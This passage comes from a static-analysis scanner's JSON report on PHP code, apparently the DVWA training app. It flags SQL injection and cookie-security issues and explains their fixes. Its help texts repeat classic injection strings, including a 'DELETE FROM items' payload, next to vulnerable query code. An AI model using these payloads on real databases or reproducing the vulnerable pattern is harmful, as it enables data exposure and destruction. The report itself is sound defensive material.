            "text" : "On line 18 of PGSQL.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n2. The data is used to dynamically construct a SQL query.\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4593/?engineType=SCA&issue=9293F4734572E9C37681DE03DE49EA88"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4745",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "On line 25 of PGSQL.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n2. The data is used to dynamically construct a SQL query.\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4745/?engineType=SCA&issue=F56B1F0126F201CE3594086E6696AD3D"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4391",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "Line 66 of PGSQL.php invokes a SQL query built with input that comes from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n\n\n2. The data is used to dynamically construct a SQL query.\n\n\nIn this case, the data is passed to pg_query() in PGSQL.php on line 66.\n\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4391/?engineType=SCA&issue=138A50507C0E35ADFBD7FF75D8848BA3"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4454",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "Line 66 of PGSQL.php invokes a SQL query built with input that comes from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n\n\n2. The data is used to dynamically construct a SQL query.\n\n\nIn this case, the data is passed to pg_query() in PGSQL.php on line 66.\n\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4454/?engineType=SCA&issue=3BE6065DDE47C93A558D70D1EFAC4D68"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4426",
          "shortDescription" : {
            "text" : "System Information Leak: Internal"
          },
          "fullDescription" : {
            "text" : "The program might reveal system data or debugging information in dvwaPage.inc.php with a call to setcookie() on line 153. The information revealed by setcookie() could help an adversary form a plan of attack.\n\n\n"
          },
          "help" : {
            "text" : "An internal information leak occurs when system data or debug information is sent to a local file, console, or screen via printing or logging.\n\n\nIn this case system data or debugging information is produced by session_id() and leaked by setcookie() in dvwaPage.inc.php on line 153.\n\n\nExample 1: The following code writes an exception to the standard error stream:\n\n\n&lt;?php\n    ...\n    echo \"Server error! Printing the backtrace\";\n    debug_print_backtrace();\n    ...\n?&gt;\n\n\nDepending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a user. In some cases, the error message provides the attacker with the precise type of attack to which the system is vulnerable. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In Example 1, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.\n\nWrite error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Debug traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example).\n\nEven brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an \"Access Denied\" message can reveal that a file or user exists on the system.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4426/?engineType=SCA&issue=27E51EE72CCC2DDEEC6BD52BBD140A0E"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4576",
          "shortDescription" : {
            "text" : "Cookie Security: Overly Broad Path"
          },
          "fullDescription" : {
            "text" : "A cookie with an overly broad path can be accessed through other applications on the same domain.\n\n\n"
          },
          "help" : {
            "text" : "Developers often set cookies to be accessible from the root context path (\"/\"). This exposes the cookie to all web applications on the domain. Because cookies often carry sensitive information such as session identifiers, sharing cookies across applications can cause a vulnerability in one application to compromise another application.\n\nExample 1:\nImagine you have a forum application deployed at http://communitypages.example.com/MyForum and the application sets a session ID cookie with path \"/\" when users log in to the forum.\n\nFor example:\n\n  setcookie(\"mySessionId\", getSessionID(), 0, \"/\", \"communitypages.example.com\", true, true);\n\n\nSuppose an attacker creates another application at http://communitypages.example.com/EvilSite and posts a link to this site on the forum. When a user of the forum clicks this link, the browser will send the cookie set by /MyForum to the application running at /EvilSite. By stealing the session ID, the attacker can compromise the account of any forum user that browsed to /EvilSite.\n\nIn addition to reading a cookie, it might be possible for attackers to perform a Cookie Poisoning attack by using /EvilSite to create its own overly broad cookie that overwrites the cookie from /MyForum.\n\nMake sure to set cookie paths to be as restrictive as possible.\n\nExample 2: The following code shows how to set the cookie path to \"/MyForum\" for the example in the Explanation section.\n\nsetcookie(\"mySessionId\", getSessionID(), 0, \"/MyForum\", \"communitypages.example.com\", true, true);\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4576/?engineType=SCA&issue=8B43EFF9DC6F2B4BC374031575D0BA61"
          },
          "properties" : {
            "tags" : [ "High" ],
            "precision" : "low"
          }
        }, {
          "id" : "4648",
          "shortDescription" : {
            "text" : "Cookie Security: HTTPOnly not Set"
          },
          "fullDescription" : {
            "text" : "The program creates a cookie in dvwaPage.inc.php on line 153, but fails to set the <code>HttpOnly</code> flag to <code>true</code>.\n\n\n"
          },
          "help" : {
            "text" : "All major browsers support the HttpOnly cookie property that prevents client-side scripts from accessing the cookie. Cross-site scripting attacks often access cookies in an attempt to steal session identifiers or authentication tokens. Without HttpOnly enabled, attackers have easier access to user cookies.\n  \nIn this case, a cookie is set in dvwaPage.inc.php on line 153, but the HttpOnly parameter is not set or is set to false.\n  \n\nExample 1: The following code creates a cookie without setting the HttpOnly property.\n\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\", TRUE);  //Missing 7th parameter to set HttpOnly\n\n\nEnable the HttpOnly property when you create cookies. You can do this by setting the HttpOnly parameter in the setcookie() call to true.\n\nExample 2: The following code creates the same cookie as the code in Example 1, but this time sets the HttpOnly parameter to true.\n\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\", TRUE, TRUE);\n\n\nSeveral mechanisms to bypass setting HttpOnly to true have been developed, and therefore it is not completely effective.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4648/?engineType=SCA&issue=B6BB896B43F1B1FA2ED07DDB9EDD65CA"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4698",
          "shortDescription" : {
            "text" : "Cookie Security: Cookie not Sent Over SSL"
          },
          "fullDescription" : {
            "text" : "The program creates a cookie without setting the <code>Secure</code> flag to <code>true</code>\n\n\n"
          },
          "help" : {
            "text" : "Modern web browsers support a Secure flag for each cookie. If the flag is set, the browser will only send the cookie over HTTPS. Sending cookies over an unencrypted channel can expose them to network sniffing attacks, so the secure flag helps keep a cookie's value confidential. This is especially important if the cookie contains private data or carries a session identifier.\n  \n\nExample 1: The following code adds a cookie to the response without setting the Secure flag.\n\n...\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\");\n...\n\n\nIf an application uses both HTTPS and HTTP, but does not set the Secure flag, cookies sent during an HTTPS request will also be sent during subsequent HTTP requests. Attackers may then compromise the cookie by sniffing the unencrypted network traffic, which is particularly easy over wireless networks.\n\nSet the Secure flag on all new cookies in order to instruct browsers not to send these cookies in the clear. This can be accomplished by passing true as the sixth argument to setcookie().\n\nExample 2: The following code corrects the mistake in Example 1 by setting the Secure flag to true.\n\n\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\", TRUE);\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4698/?engineType=SCA&issue=DE8378141101E5FC99CEE163F203D28A"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4625",
          "shortDescription" : {
            "text" : "Cookie Security: HTTPOnly not Set"
          },
          "fullDescription" : {
            "text" : "The program creates a cookie in dvwaPage.inc.php on line 154, but fails to set the <code>HttpOnly</code> flag to <code>true</code>.\n\n\n"
          },
          "help" : {
            "text" : "All major browsers support the HttpOnly cookie property that prevents client-side scripts from accessing the cookie. Cross-site scripting attacks often access cookies in an attempt to steal session identifiers or authentication tokens. Without HttpOnly enabled, attackers have easier access to user cookies.\n  \nIn this case, a cookie is set in dvwaPage.inc.php on line 154, but the HttpOnly parameter is not set or is set to false.\n  \n\nExample 1: The following code creates a cookie without setting the HttpOnly property.\n\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\", TRUE);  //Missing 7th parameter to set HttpOnly\n\n\nEnable the HttpOnly property when you create cookies. You can do this by setting the HttpOnly parameter in the setcookie() call to true.\n\nExample 2: The following code creates the same cookie as the code in Example 1, but this time sets the HttpOnly parameter to true.\n\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\", TRUE, TRUE);\n\n\nSeveral mechanisms to bypass setting HttpOnly to true have been developed, and therefore it is not completely effective.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4625/?engineType=SCA&issue=A88958450144320BF96437693C3B4CB2"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4722",
          "shortDescription" : {
            "text" : "Cookie Security: Overly Broad Path"
          },
          "fullDescription" : {
            "text" : "A cookie with an overly broad path can be accessed through other applications on the same domain.\n\n\n"
          },
          "help" : {
